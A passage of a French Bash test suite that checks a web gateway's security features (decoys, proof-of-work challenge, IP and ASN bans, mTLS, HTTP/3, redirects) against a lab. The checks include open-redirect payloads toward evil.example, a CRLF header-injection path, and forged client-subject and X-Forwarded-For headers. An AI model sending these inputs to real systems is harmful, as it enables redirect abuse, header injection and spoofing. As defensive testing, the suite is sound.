  h1=$(metric 'gpx_threat_decoy_total{result="hit"}'); [ "$(delta "$h0" "$h1")" = 1 ] && ok "compteur gpx_threat_decoy_total{hit} : +1" || ko "compteur hit : +$(delta "$h0" "$h1") (attendu 1)"

  # garde-fou : un chemin que l'application sert (location) n'est jamais un piège
  k0=$(metric 'gpx_threat_decoy_total{result="skipped"}')
  check "garde-fou : /api/v1/admin/ est servi par une location de la route (401, pas un piège)" "$(code -H "X-Forwarded-For: $e" "$(u acl)/api/v1/admin/x")" 401
  k1=$(metric 'gpx_threat_decoy_total{result="skipped"}'); [ "$(delta "$k0" "$k1")" = 1 ] && ok "compteur gpx_threat_decoy_total{skipped} : +1" || ko "compteur skipped : +$(delta "$k0" "$k1") (attendu 1)"
  check "garde-fou : l'IP n'est pas bannie" "$(code -H "X-Forwarded-For: $e" "$(u plain)/whoami")" 200
  eph_unban $c $d $e; eph_restore
}

t_challenge() { section challenge "Ephor, défi à preuve de travail : seuil, navigation contre API, résolution, la preuve n'efface pas la note (labo local seulement)" || return
  eph_prepare || return
  # IP tirées au hasard : le score cumulé d'Ephor survit entre deux passages (demi-vie 10 min), une IP fixe arriverait déjà notée
  local f=198.51.100.$((10 + RANDOM % 20)) g=198.51.100.$((30 + RANDOM % 20)) ua='labclient/1.0' jar=/tmp/lab-chal.jar tok bits n bad zeros h sh0 sh1 sv0 sv1 sl0 sl1 fa0 fa1
  cfg() { echo "{\"enabled\":true,\"mode\":\"block\",\"ban_duration\":\"10m\",\"decoys\":{\"mode\":\"block\"},\"ip_score\":{\"enabled\":true,\"ban_threshold\":10,\"half_life\":\"10m\"},\"challenge\":{\"mode\":\"$1\",\"threshold\":4,\"difficulty\":4}}"; }
  nav() { curl -s -o /tmp/chal.body -w '%{http_code}' --max-time 20 -A "$ua" -b $jar -c $jar -H "X-Forwarded-For: $1" -H 'Accept: text/html' -H 'Sec-Fetch-Mode: navigate' "$(u plain)/$2"; }
  has_chal() { grep -q 'gpxToken' /tmp/chal.body; }

  # detect : le défi qui aurait été imposé est compté, jamais servi
  eph_put "$(cfg detect)" || { eph_restore; return; }
  sh0=$(metric 'gpx_threat_challenge_total{result="shadow"}')
  code -A "$ua" -H "X-Forwarded-For: $f" "$(u plain)/.git/config" >/dev/null   # un leurre verse 8 points : au-dessus du seuil de défi (4), sous le ban (10)
  rm -f $jar; c=$(nav $f page)
  [ "$c" = 404 ] && ! has_chal && ok "challenge detect : la navigation n'est pas défiée (404 de l'application)" || ko "challenge detect : $c, page de défi servie ?"
  sh1=$(metric 'gpx_threat_challenge_total{result="shadow"}'); [ "$(delta "$sh0" "$sh1")" = 1 ] && ok "compteur gpx_threat_challenge_total{shadow} : +1" || ko "compteur shadow : +$(delta "$sh0" "$sh1") (attendu 1)"

  # block : une navigation reçoit le défi, un client d'API de la même IP non
  eph_put "$(cfg block)" || { eph_restore; return; }
  sv0=$(metric 'gpx_threat_challenge_total{result="served"}'); sl0=$(metric 'gpx_threat_challenge_total{result="solved"}'); fa0=$(metric 'gpx_threat_challenge_total{result="failed"}')
  code -A "$ua" -H "X-Forwarded-For: $g" "$(u plain)/.git/config" >/dev/null
  rm -f $jar; c=$(nav $g page)
  [ "$c" = 200 ] && has_chal && ok "challenge block : la navigation reçoit la page de défi" || ko "challenge block : $c, pas de page de défi"
  check "challenge block : un client d'API de la même IP n'est pas défié" "$(code -A "$ua" -H 'Accept: application/json' -H "X-Forwarded-For: $g" "$(u plain)/whoami")" 200
  sv1=$(metric 'gpx_threat_challenge_total{result="served"}'); [ "$(delta "$sv0" "$sv1")" = 1 ] && ok "compteur gpx_threat_challenge_total{served} : +1" || ko "compteur served : +$(delta "$sv0" "$sv1") (attendu 1)"

  # résolution : SHA-256(jeton:nonce) avec « bits » bits de tête à zéro
  tok=$(grep -o 'var gpxToken="[^"]*"' /tmp/chal.body | sed 's/var gpxToken="//; s/"$//'); bits=$(echo "$tok" | cut -d. -f3)
  if [ -z "$tok" ] || [ $((bits % 4)) != 0 ]; then ko "jeton de défi illisible ou difficulté inattendue (« $bits »)"; else
    zeros=$(printf '%*s' $((bits / 4)) '' | tr ' ' 0); n=0
    while :; do h=$(printf '%s:%s' "$tok" "$n" | sha256sum); case $h in "$zeros"*) break ;; esac; n=$((n+1)); [ $n -gt 200000 ] && break; done
    verify() { curl -s -o /dev/null -D /tmp/chal.hdr -w '%{http_code}' --max-time 20 -A "$ua" -b $jar -c $jar -H "X-Forwarded-For: $g" -H 'Content-Type: application/json' -X POST -d "{\"c\":\"$tok\",\"n\":\"$1\"}" "$(u plain)/.gpx/ephor-challenge"; }
    # un nonce fixe serait valide une fois sur 2^bits (le jeton change à chaque passage) : on en cherche un qui ne l'est pas
    bad=zzz; while :; do h=$(printf '%s:%s' "$tok" "$bad" | sha256sum); case $h in "$zeros"*) bad="${bad}z" ;; *) break ;; esac; done
    denied "mauvais nonce refusé" "$(verify "$bad")"
    c=$(verify "$n"); [ "$c" = 204 ] && grep -qi '^set-cookie: _gpx_ephor' /tmp/chal.hdr && ok "bon nonce ($n) accepté, cookie _gpx_ephor posé" || ko "résolution du défi : $c"
    denied "jeton falsifié refusé" "$(curl -s -o /dev/null -w '%{http_code}' -A "$ua" -b $jar -H "X-Forwarded-For: $g" -H 'Content-Type: application/json' -X POST -d "{\"c\":\"${tok%?}0\",\"n\":\"$n\"}" "$(u plain)/.gpx/ephor-challenge")"
    c=$(nav $g page); [ "$c" = 404 ] && ! has_chal && ok "avec la preuve la navigation n'est plus défiée (404 de l'application)" || ko "navigation avec preuve : $c"
    sl1=$(metric 'gpx_threat_challenge_total{result="solved"}'); fa1=$(metric 'gpx_threat_challenge_total{result="failed"}')
    [ "$(delta "$sl0" "$sl1")" = 1 ] && ok "compteur gpx_threat_challenge_total{solved} : +1" || ko "compteur solved : +$(delta "$sl0" "$sl1") (attendu 1)"
    at_least "$(delta "$fa0" "$fa1")" 1 && ok "compteur gpx_threat_challenge_total{failed} : +$(delta "$fa0" "$fa1")" || ko "compteur failed : +$(delta "$fa0" "$fa1")"
  fi
  # résoudre le défi n'efface pas la note : un second leurre (8 + 8 > 10) bannit malgré la preuve
  c=$(code -A "$ua" -b $jar -H "X-Forwarded-For: $g" "$(u plain)/.git/config"); sleep 1
  check "la preuve n'empêche pas le ban quand la note atteint le seuil" "$(code -A "$ua" -b $jar -H "X-Forwarded-For: $g" "$(u plain)/whoami")" 403
  eph_unban $f $g; rm -f $jar /tmp/chal.body /tmp/chal.hdr; eph_restore
}

until_code() { # attendu tentatives commande… -> dernier code obtenu (une tentative toutes les 2 s : la passerelle applique la configuration avec un léger délai)
  local want=$1 n=$2 c i; shift 2
  for i in $(seq 1 "$n"); do c=$("$@"); [ "$c" = "$want" ] && break; sleep 2; done
  echo "$c"
}

t_ipcontrols() { section ipcontrols "Contrôles par adresse : filtre IP de route, ban de plage, listes blanches, profils IP (IP annoncées par X-Forwarded-For)" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return; }
  detect_trust
  if [ $TRUSTED != 1 ]; then skip "il faut pouvoir annoncer une IP par X-Forwarded-For (poste de confiance)"; return; fi
  local out=198.51.100.230 inside=198.51.100.165 denied_ip=198.51.100.180 bid id pid1 pid2 a b c
  as() { code -H "X-Forwarded-For: $1" "$(u "$2")${3:-/whoami}"; }   # ip route [chemin]

  # filtre IP d'une route : une IP annoncée dans la liste passe (allow) ou est refusée (deny), les autres l'inverse
  check "ip_filter allow : IP de la liste ($inside)" "$(as $inside ipfilter)" 200
  check "ip_filter allow : IP hors liste ($out)" "$(as $out ipfilter)" 403
  check "ip_filter deny : IP de la liste ($denied_ip)" "$(as $denied_ip ipdeny)" 403
  check "ip_filter deny : IP hors liste ($out)" "$(as $out ipdeny)" 200

  # ban d'une plage : s'applique à toutes ses adresses, pas aux voisines, se lève
  acode "$token" POST /api/v1/security/bans "$(jq -n --arg e "$(date -u -d '+10 minutes' +%FT%TZ)" '{ip:"198.51.100.192/28",reason:"lab-sec plage",expires_at:$e}')" >/dev/null; bid=$(jq -r '.id // empty' /tmp/adm.body)
  if [ -z "$bid" ]; then ko "ban de la plage 198.51.100.192/28 refusé : $(head -c 150 /tmp/adm.body)"; else
    check "ban de plage : une adresse de la plage est refusée (.200)" "$(until_code 403 10 as 198.51.100.200 plain)" 403
    check "ban de plage : toute la plage, y compris sa dernière adresse (.207)" "$(as 198.51.100.207 plain)" 403
    check "ban de plage : une adresse voisine n'est pas touchée (.208)" "$(as 198.51.100.208 plain)" 200
    check "ban de plage levé" "$(acode "$token" DELETE "/api/v1/security/bans/$bid")" 204
    check "après la levée la plage est de nouveau servie" "$(until_code 200 10 as 198.51.100.200 plain)" 200
  fi

  # la suite règle la configuration globale d'Ephor et crée des profils : labo local seulement
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "listes blanches d'Ephor et profils IP : modifient la configuration globale, réservés au labo local jetable"; return; fi
  acode "$token" GET /api/v1/security/threat-config >/dev/null; EPH_PREV=$(cat /tmp/adm.body)
  scan10() { local k r=""; for k in $(seq 1 10); do r="$r $(as "$1" "$2" "/inexistant-$k")"; sleep 0.15; done; echo "$r"; }
  count403() { echo "$1" | tr ' ' '\n' | grep -c '^403$'; }
  eph_put '{"enabled":true,"mode":"block","ban_duration":"10m","error_threshold":5,"error_window":"30s"}' || { eph_restore; return; }

  # liste blanche d'Ephor d'une route : l'IP listée n'est jamais bannie, sa voisine l'est pour les mêmes erreurs
  a=$(scan10 198.51.100.120 wl); b=$(scan10 198.51.100.121 wl)
  [ "$(count403 "$a")" = 0 ] && ok "liste blanche d'Ephor de la route : l'IP listée n'est jamais refusée malgré 10 erreurs 4xx" || ko "IP en liste blanche d'Ephor refusée ($a)"
  [ "$(count403 "$b")" -ge 4 ] && ok "une IP voisine non listée est bannie pour les mêmes erreurs ($(count403 "$b")/10 en 403)" || ko "témoin non banni ($b) : Ephor ne détecte rien, le test ci-dessus ne prouve rien"

  # liste blanche des bans : aucun ban ne l'atteint, Ephor ne l'évalue pas, un ban manuel est refusé
  c=$(acode "$token" POST /api/v1/security/bans/whitelist '{"ip":"198.51.100.130","comment":"lab-sec"}'); sleep 5
  [ "$c" = 201 ] || ko "ajout à la liste blanche des bans : $c $(head -c 120 /tmp/adm.body)"
  a=$(scan10 198.51.100.130 plain)
  [ "$(count403 "$a")" = 0 ] && ok "liste blanche des bans : l'IP n'est jamais refusée malgré 10 erreurs 4xx" || ko "IP en liste blanche des bans refusée ($a)"
  check "ban manuel d'une IP en liste blanche refusé" "$(acode "$token" POST /api/v1/security/bans '{"ip":"198.51.100.130","reason":"lab-sec"}')" 409
  check "retrait de la liste blanche des bans" "$(acode "$token" DELETE "/api/v1/security/bans/whitelist?ip=198.51.100.130")" 204

  # profils IP : deny refuse, allow l'emporte sur deny, la suppression rend l'accès
  c=$(acode "$token" POST /api/v1/ip-profiles '{"name":"lab-sec deny","mode":"deny","cidrs":["198.51.100.136/30"],"enabled":true}'); pid1=$(jq -r '.id // empty' /tmp/adm.body)
  if [ "$c" != 201 ]; then ko "création du profil deny : $c $(head -c 150 /tmp/adm.body)"; else
    check "profil deny : une adresse de la plage est refusée (.137)" "$(until_code 403 10 as 198.51.100.137 plain)" 403
    check "profil deny : toute la plage /30 (.139)" "$(as 198.51.100.139 plain)" 403
    check "profil deny : une adresse hors plage passe (.150)" "$(as 198.51.100.150 plain)" 200
    c=$(acode "$token" POST /api/v1/ip-profiles '{"name":"lab-sec allow","mode":"allow","cidrs":["198.51.100.137"],"enabled":true}'); pid2=$(jq -r '.id // empty' /tmp/adm.body)
    [ "$c" = 201 ] || ko "création du profil allow : $c $(head -c 150 /tmp/adm.body)"
    check "profil allow : l'adresse listée passe malgré le deny (.137)" "$(until_code 200 10 as 198.51.100.137 plain)" 200
    check "profil allow : le reste de la plage deny reste refusé (.138)" "$(as 198.51.100.138 plain)" 403
    for id in $pid1 $pid2; do [ -n "$id" ] && acode "$token" DELETE "/api/v1/ip-profiles/$id" >/dev/null; done
    check "profils supprimés : la plage est de nouveau servie (.138)" "$(until_code 200 10 as 198.51.100.138 plain)" 200
  fi
  eph_unban 198.51.100.121 198.51.100.130; eph_restore
}

t_geoip() { section geoip "GeoIP : filtre par pays d'une route (base de test MaxMind, adresses connues)" || return
  detect_trust
  if [ $TRUSTED != 1 ]; then skip "il faut pouvoir annoncer une IP par X-Forwarded-For (poste de confiance)"; return; fi
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "la base de test doit être montée sur la passerelle : réservé au labo local"; return; fi
  as() { code -H "X-Forwarded-For: $1" "$(u geo)/whoami"; }
  # témoin : sans base lisible, la route laisse tout passer et rien ci-dessous ne prouve quoi que ce soit
  if [ "$(as 81.2.69.142)" != 403 ]; then skip "81.2.69.142 (GB) n'est pas refusé : base GeoIP de test absente ou illisible (téléchargement échoué ?)"; return; fi
  ok "route geo_ip deny GB : 81.2.69.142 (Royaume-Uni) refusé"
  check "2.125.160.216 (Royaume-Uni, autre plage) refusé" "$(as 2.125.160.216)" 403
  check "89.160.20.112 (Suède) passe" "$(as 89.160.20.112)" 200
  check "216.160.83.56 (États-Unis) passe" "$(as 216.160.83.56)" 200
  check "67.43.156.1 (Bhoutan) passe" "$(as 67.43.156.1)" 200
  check "une adresse absente de la base n'est pas refusée (198.51.100.230)" "$(as 198.51.100.230)" 200
}

refused() { case "$2" in 000|401|403) ok "$1 ($2)" ;; *) ko "$1 : obtenu $2, attendu un refus (000 = poignée de main refusée, 401, 403)" ;; esac; }

t_mtls() { section mtls "mTLS par route : certificat client exigé et vérifié à la poignée de main, SAN autorisés, mode facultatif (labo local seulement)" || return
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "l'autorité de test doit être lisible par la passerelle : réservé au labo local"; return; fi
  local d=/fixtures/mtls req subj
  [ -f $d/ca.pem ] && [ -f $d/client.pem ] || { skip "certificats de test absents ($d) : déploiement distant ?"; return; }
  req() { curl -sk --max-time 15 -o /tmp/mtls.body -w '%{http_code}' "$@"; }     # 000 : poignée de main refusée
  subj() { jq -r '.headers["X-Client-Subject"][0] // ""' /tmp/mtls.body 2>/dev/null; }
  local R="$(us mtls)/echo" O="$(us mtls-opt)/echo"

  # route qui exige un certificat client
  check "mtls exigé : un client au certificat valide est servi" "$(req --cert $d/client.pem --key $d/client.key "$R")" 200
  case "$(subj)" in *"CN=client"*|*"CN=client,"*) ok "le sujet du certificat est transmis au backend (« $(subj) »)" ;; *) ko "sujet du certificat absent chez le backend (« $(subj) »)" ;; esac
  req --cert $d/client.pem --key $d/client.key -H 'X-Client-Subject: CN=admin' "$R" >/dev/null
  case "$(subj)" in *admin*) ko "en-tête du sujet forgé par le client transmis au backend (« $(subj) »)" ;; *) ok "en-tête du sujet forgé par le client écrasé (« $(subj) »)" ;; esac
  refused "mtls exigé : sans certificat client" "$(req "$R")"
  refused "mtls exigé : certificat d'une autre autorité" "$(req --cert $d/client-rogue.pem --key $d/client-rogue.key "$R")"
  refused "mtls exigé : certificat qui n'a pas l'usage « client » (serverAuth seul)" "$(req --cert $d/client-serverauth.pem --key $d/client-serverauth.key "$R")"
  [ -f $d/expired.pem ] && refused "mtls exigé : certificat expiré" "$(req --cert $d/expired.pem --key $d/expired.key "$R")" || skip "certificat expiré de test non généré"
  check "mtls exigé : certificat valide mais SAN non autorisé" "$(req --cert $d/client-othersan.pem --key $d/client-othersan.key "$R")" 403

  # route où le certificat est facultatif : sans certificat on passe, un certificat présenté doit être valide
  check "mtls facultatif : sans certificat" "$(req "$O")" 200
  check "mtls facultatif : certificat valide" "$(req --cert $d/client.pem --key $d/client.key "$O")" 200
  case "$(subj)" in *"CN=client"*) ok "mtls facultatif : sujet transmis (« $(subj) »)" ;; *) ko "mtls facultatif : sujet absent (« $(subj) »)" ;; esac
  refused "mtls facultatif : un certificat d'une autre autorité n'est pas accepté" "$(req --cert $d/client-rogue.pem --key $d/client-rogue.key "$O")"
}

t_asn() { section asn "Bans par ASN : recherche, aperçu, ban de toutes les plages d'un ASN, levée (mini-base ip2asn du labo, labo local seulement)" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return; }
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "les ASN de test (64496, 64497) n'existent que dans la mini-base du labo"; return; fi
  detect_trust
  local in_a=198.51.100.210 in_a2=198.51.100.235 in_b=198.51.100.218 in_b2=198.51.100.245 c
  as() { code -H "X-Forwarded-For: $1" "$(u plain)/whoami"; }
  # l'état de la base ne compte rien tant qu'une première requête ne l'a pas chargée en mémoire (juste après un démarrage de l'Admin)
  acode "$token" GET "/api/v1/security/asn?q=AS64496" >/dev/null
  acode "$token" GET /api/v1/security/asn/info >/dev/null
  if [ "$(jq -r '.installed // false' /tmp/adm.body)" != true ] || [ "$(jq -r '.asns // 0' /tmp/adm.body)" != 2 ]; then
    skip "la mini-base ASN du labo n'est pas chargée par l'Admin (GPX_ASN_DB_PATH) : $(head -c 120 /tmp/adm.body)"; return; fi
  ok "base ASN du labo chargée : $(jq -r '"\(.asns) ASN"' /tmp/adm.body)"

  acode "$token" GET "/api/v1/security/asn?q=$in_a" >/dev/null
  [ "$(jq -r '.[0].asn // 0' /tmp/adm.body)" = 64496 ] && [ "$(jq -r '.[0].name // ""' /tmp/adm.body)" = LAB-TEST-AS-A ] && ok "recherche par adresse : $in_a est annoncée par AS64496 (LAB-TEST-AS-A)" || ko "recherche par adresse : $(head -c 160 /tmp/adm.body)"
  acode "$token" GET "/api/v1/security/asn?q=AS64497" >/dev/null
  [ "$(jq -r '.[0].asn // 0' /tmp/adm.body)" = 64497 ] && ok "recherche par numéro : AS64497" || ko "recherche par numéro : $(head -c 160 /tmp/adm.body)"
  acode "$token" GET "/api/v1/security/asn?q=LAB-TEST" >/dev/null
  [ "$(jq 'length' /tmp/adm.body 2>/dev/null)" = 2 ] && ok "recherche par nom : les deux ASN du labo" || ko "recherche par nom : $(head -c 160 /tmp/adm.body)"
  acode "$token" GET "/api/v1/security/asn/preview?asn=64496" >/dev/null
  [ "$(jq -r '.would_create // 0' /tmp/adm.body)" = 2 ] && ok "aperçu : 2 plages seraient bannies, rien n'est créé" || ko "aperçu : $(jq -c '{would_create,prefixes,too_wide}' /tmp/adm.body)"

  # dry_run : aucun effet
  acode "$token" POST /api/v1/security/asn/ban '{"asn":"64496","reason":"lab-sec asn","dry_run":true}' >/dev/null
  [ "$(jq -r '.created // -1' /tmp/adm.body)" = 2 ] && ok "dry_run : 2 bans annoncés" || ko "dry_run : $(head -c 200 /tmp/adm.body)"
  sleep 3; check "dry_run : aucune adresse de l'ASN n'est refusée" "$(as $in_a)" 200

  # erreurs
  check "ASN inconnu : 404" "$(acode "$token" POST /api/v1/security/asn/ban '{"asn":"64499"}')" 404
  check "ASN invalide : 400" "$(acode "$token" POST /api/v1/security/asn/ban '{"asn":"pas-un-asn"}')" 400
  if [ $TRUSTED = 1 ]; then
    c=$(curl -s -o /tmp/adm.body -w '%{http_code}' --max-time 20 -X POST -H "Authorization: Bearer $token" -H 'Content-Type: application/json' -H "X-Forwarded-For: $in_a" -d '{"asn":"64496"}' "$LAB_ADMIN_URL/api/v1/security/asn/ban")
    check "bannir l'ASN qui contient l'adresse de l'appelant est refusé" "$c" 409
  else skip "ASN de l'appelant (409) : il faut pouvoir annoncer une IP par X-Forwarded-For"; fi

  # ban réel
  if [ $TRUSTED != 1 ]; then skip "application du ban d'ASN : il faut pouvoir annoncer une IP par X-Forwarded-For"; return; fi
  acode "$token" POST /api/v1/security/asn/ban '{"asn":"64496","reason":"lab-sec asn"}' >/dev/null
  [ "$(jq -r '.created // -1' /tmp/adm.body)" = 2 ] && ok "ban de l'AS64496 : une plage créée par plage annoncée (2)" || { ko "ban d'ASN : $(head -c 200 /tmp/adm.body)"; return; }
  check "ban d'ASN : première plage refusée ($in_a)" "$(until_code 403 10 as $in_a)" 403
  check "ban d'ASN : deuxième plage refusée ($in_a2)" "$(as $in_a2)" 403
  check "ban d'ASN : l'autre ASN n'est pas touché ($in_b, $in_b2)" "$(as $in_b)$(as $in_b2)" 200200
  # les bans portent les plages (198.51.100.208/29…) : le filtre ?ip= cherche une sous-chaîne de cette valeur
  acode "$token" GET "/api/v1/security/bans?ip=198.51.100.2" >/dev/null
  [ "$(jq '[.[] | select(.asn == 64496)] | length' /tmp/adm.body 2>/dev/null)" = 2 ] && ok "les 2 bans portent l'ASN (64496) dans la liste des bans" || ko "bans sans ASN dans la liste : $(jq -c '[.[] | {ip,asn}]' /tmp/adm.body 2>/dev/null | head -c 200)"
  acode "$token" POST /api/v1/security/asn/ban '{"asn":"64496","reason":"lab-sec asn"}' >/dev/null
  [ "$(jq -r '.created // -1' /tmp/adm.body)" = 0 ] && ok "relancer le ban ne duplique rien (plages déjà bannies ignorées)" || ko "second ban : $(jq -c '{created,skipped_count}' /tmp/adm.body)"
  acode "$token" DELETE "/api/v1/security/asn/ban?asn=64496" >/dev/null
  [ "$(jq -r '.removed // 0' /tmp/adm.body)" = 2 ] && ok "levée : 2 bans supprimés" || ko "levée : $(head -c 160 /tmp/adm.body)"
  check "après la levée l'ASN est de nouveau servi" "$(until_code 200 10 as $in_a)" 200
}

t_http3() { section http3 "HTTP/3 (QUIC) : écoute sur 443/udp, annonce Alt-Svc, même chaîne de sécurité qu'en TCP (labo local seulement)" || return
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "la sonde HTTP/3 n'est pas fournie au runner d'une cible distante"; return; fi
  [ -x /fixtures/h3probe ] || { skip "sonde HTTP/3 absente (Go indisponible sur le poste de test ?)"; return; }
  local ip out hdr bid
  ip=$(getent hosts "$EDGE_HOST" | awk '{print $1; exit}')
  h3() { /fixtures/h3probe -addr "$ip:443" -sni "$1" -path "$2" "${@:3}" 2>&1; }
  h3code() { h3 "$@" | head -1 | awk '{print $2}'; }

  out=$(h3 lab-sec-tls.lab.test /whoami -show alt-svc)
  case "$(echo "$out" | head -1)" in "HTTP/3.0 200") ok "HTTP/3 : une requête QUIC sur $ip:443/udp est servie (200)" ;; *) ko "HTTP/3 : pas de réponse en QUIC sur $ip:443/udp : $(echo "$out" | head -1)" ;; esac
  # un client apprend l'existence de HTTP/3 par l'en-tête Alt-Svc reçu en HTTPS (TCP) ; sans lui, personne n'essaie QUIC
  hdr=$(curl -skI --max-time 15 "$(us tls)/whoami" | tr -d '\r' | grep -i '^alt-svc:')
  case "$hdr" in *'h3=":443"'*) ok "Alt-Svc annoncé en HTTPS : $hdr" ;; *) ko "Alt-Svc absent ou erroné sur la réponse HTTPS (« $hdr »)" ;; esac
  hdr=$(curl -sI --max-time 15 -H 'Host: lab-sec-redirect.lab.test' "http://$EDGE_HOST/" | tr -d '\r' | grep -i '^alt-svc:')
  [ -z "$hdr" ] && ok "pas d'Alt-Svc sur une réponse en clair (un client l'ignorerait)" || ko "Alt-Svc sur une réponse en clair : $hdr"
  hdr=$(curl -sk --max-time 15 -D- -o /dev/null "$(us mtls-opt)/whoami" | tr -d '\r' | grep -i '^alt-svc:')
  [ -z "$hdr" ] && ok "route mTLS : HTTP/3 n'est pas annoncé (QUIC ne porte pas de certificat client)" || ko "route mTLS : Alt-Svc annoncé alors que QUIC ne vérifie pas le certificat client ($hdr)"

  # la chaîne de sécurité s'applique en QUIC comme en TCP
  check "route à redirection HTTPS : en QUIC la requête est déjà sécurisée (pas de 308)" "$(h3code lab-sec-redirect.lab.test /whoami)" 200
  check "route mTLS exigé : sans certificat client la requête QUIC est refusée" "$(h3code lab-sec-mtls.lab.test /whoami)" 401
  detect_trust
  if [ $TRUSTED = 1 ] && [ -n "${token:-}" ]; then
    acode "$token" POST /api/v1/security/bans "$(jq -n --arg e "$(date -u -d '+10 minutes' +%FT%TZ)" '{ip:"198.51.100.240",reason:"lab-sec h3",expires_at:$e}')" >/dev/null; bid=$(jq -r '.id // empty' /tmp/adm.body)
    if [ -n "$bid" ]; then
      check "un ban s'applique aussi en QUIC" "$(until_code 403 10 h3code lab-sec-tls.lab.test /whoami -H 'X-Forwarded-For: 198.51.100.240')" 403
      check "une autre IP n'est pas touchée en QUIC" "$(h3code lab-sec-tls.lab.test /whoami -H 'X-Forwarded-For: 198.51.100.241')" 200
      acode "$token" DELETE "/api/v1/security/bans/$bid" >/dev/null
    else ko "ban de test refusé : $(head -c 150 /tmp/adm.body)"; fi
  else skip "ban en QUIC : il faut pouvoir annoncer une IP par X-Forwarded-For"; fi
}

t_internal() { section internal "API interne passerelle ↔ Admin, MCP, ports de contrôle : fermés sans jeton" || return
  local c p
  if [ -n "${LAB_ADMIN_URL:-}" ]; then
    for p in 'POST /internal/v1/heartbeat' 'GET /internal/v1/routes' 'POST /internal/v1/security/bans'; do
      c=$(code -X "${p%% *}" -d '{}' "$LAB_ADMIN_URL${p#* }"); denied "Admin ${p#* } sans jeton d'appairage" "$c"
      c=$(code -X "${p%% *}" -d '{}' -H 'Authorization: Bearer gpx_pair_0000000000000000' "$LAB_ADMIN_URL${p#* }"); denied "Admin ${p#* } avec un jeton inventé" "$c"
    done
    c=$(code -X POST -H 'Content-Type: application/json' -d '{}' "$LAB_ADMIN_URL/mcp"); denied "MCP sans PAT" "$c"
    c=$(code -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer gpx_pat_0000000000000000' -d '{}' "$LAB_ADMIN_URL/mcp"); denied "MCP avec un PAT inventé" "$c"
    c=$(curl -s -o /tmp/pp.body -w '%{http_code}' --max-time 10 "$LAB_ADMIN_URL/debug/pprof/")
    case "$c:$(grep -ci 'goroutine\|heap' /tmp/pp.body)" in 2*:[1-9]*) ko "pprof exposé par l'Admin ($c)";; *) ok "pprof non exposé par l'Admin ($c)";; esac
  else skip "LAB_ADMIN_URL absent : contrôles de l'Admin ignorés"; fi
  for p in / /health /internal/v1/routes; do
    c=$(code --max-time 5 "http://$EDGE_HOST:8000$p")
    case "$c" in
      000) ok "API interne de la passerelle (:8000$p) non joignable depuis le poste de test" ;;
      401|403) ok "API interne de la passerelle (:8000$p) refuse sans jeton ($c)" ;;
      2*) ko "API interne de la passerelle (:8000$p) répond sans jeton ($c)" ;;
      *) info "API interne de la passerelle (:8000$p) : $c" ;;
    esac
  done
}

t_redirect() { section redirect "Redirection HTTP vers HTTPS (redirect_https) : cible, ouverture de redirection, boucle derrière un répartiteur" || return
  local H='Host: lab-sec-redirect.lab.test' out loc p c
  detect_trust
  out=$(curl -s -D- -o /dev/null --max-time 20 -H "$H" "http://$EDGE_HOST/page?x=1&y=%20z" | tr -d '\r')
  check "HTTP clair sur une route redirect_https" "$(echo "$out" | head -1 | awk '{print $2}')" 308
  check "Location : même adresse en HTTPS" "$(echo "$out" | awk 'tolower($1)=="location:" {print $2}')" "https://lab-sec-redirect.lab.test/page?x=1&y=%20z"
  check "méthode POST conservée (308)" "$(code -X POST -d a=1 -H "$H" "http://$EDGE_HOST/login")" 308
  check "la route en HTTPS répond" "$(code -k "$(us redirect)/whoami")" 200
  # la redirection ne s'ouvre jamais vers un autre hôte : le chemin ne peut pas devenir l'hôte de la Location
  for p in '//evil.example/x' '/\evil.example' '/%2f%2fevil.example' '/..//evil.example' '/@evil.example'; do
    loc=$(curl -s -D- -o /dev/null --max-time 20 --path-as-is -H "$H" "http://$EDGE_HOST$p" | tr -d '\r' | awk 'tolower($1)=="location:" {print $2}')
    # Location vers un autre hôte = « //hôte… » (relatif au schéma) ou « http(s)://autre » ; un chemin relatif « /x » reste sur l'hôte
    # (le routeur Go nettoie lui-même « // » et « .. » par une redirection de ce genre avant la passerelle)
    case "$loc" in
      https://lab-sec-redirect.lab.test|https://lab-sec-redirect.lab.test/*) ok "pas de redirection ouverte pour « $p » ($loc)" ;;
      //*|http://*|https://*|*'\'*) ko "redirection vers un autre hôte pour « $p » : $loc" ;;
      /*) ok "« $p » : nettoyage de chemin, même hôte ($loc)" ;;
      "") ok "« $p » refusé sans Location" ;;
      *) ko "Location inattendue pour « $p » : $loc" ;;
    esac
  done
  out=$(curl -s -D- -o /dev/null --max-time 20 --path-as-is -H "$H" "http://$EDGE_HOST/%0d%0aSet-Cookie:pwn=1" | tr -d '\r')
  echo "$out" | grep -qi '^set-cookie: pwn' && ko "injection d'en-tête par le chemin (CRLF) dans la réponse" || ok "CRLF encodé dans le chemin : aucun en-tête injecté"
  # derrière un répartiteur qui termine le TLS : X-Forwarded-Proto: https d'un pair de confiance évite la boucle, d'un pair non fiable il ne sert à rien
  c=$(code -H "$H" -H 'X-Forwarded-Proto: https' "http://$EDGE_HOST/whoami")
  if [ $TRUSTED = 1 ]; then check "X-Forwarded-Proto: https d'un pair de confiance : pas de boucle de redirection" "$c" 200
  else check "X-Forwarded-Proto: https d'un pair non fiable ne dispense pas de la redirection" "$c" 308; fi
  c=$(code -H "$H" -H 'X-Forwarded-Proto: http' "http://$EDGE_HOST/whoami"); check "X-Forwarded-Proto: http : redirection" "$c" 308
  # sans redirect_https la route TLS reste servie en clair (comportement historique)
  info "route TLS sans redirect_https, HTTP clair : $(code -H 'Host: lab-sec-tls.lab.test' "http://$EDGE_HOST/whoami")"
}

t_tls() { section tls "TLS : protocoles, suites, certificat, HTTP/2, cookies, SNI" || return
  local out hdr jar cn sig bits
  check "HTTPS (certificat auto-signé de test)" "$(code -k "$(us tls)/whoami")" 200
  out=$(tlsrun -tls1_3); case "$out" in *"TLSv1.3"*"Cipher is"*|*"Protocol  : TLSv1.3"*|*"Protocol: TLSv1.3"*) ok "TLS 1.3 accepté";; *) ko "TLS 1.3 non négocié";; esac
